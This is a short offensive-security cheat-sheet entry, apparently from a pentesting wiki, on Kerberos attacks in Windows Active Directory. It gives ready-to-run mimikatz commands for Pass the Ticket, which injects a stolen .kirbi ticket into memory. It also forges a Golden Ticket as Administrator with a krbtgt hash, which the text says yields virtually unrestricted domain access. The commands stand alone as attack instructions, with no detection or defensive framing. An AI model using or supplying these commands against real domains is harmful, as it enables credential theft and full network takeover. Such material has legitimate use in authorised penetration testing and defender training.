[[88]]
[[secretsdump.py]]
[[GetUserSPNs.py]]
[[mimikatz]]
### Pass the Ticket

Once a valid Kerberos ticket is obtained, PtT (Pass the Ticket) attacks can be performed using `mimikatz`.

```
mimikatz "kerberos::ptt ticket.kirbi"
```

Replace "ticket.kirbi" with your Kerberos ticket file.

`mimikatz` injects this ticket into memory, so any following command is authenticated against the Kerberos server using this ticket.

### Golden Ticket Attack

Creating a golden ticket allows virtually unrestricted access to the whole domain. For this, using `mimikatz` commands:

```
mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-XXXX /krbtgt:eeb9046b77d48962314e376f1925065a /id:500"
```
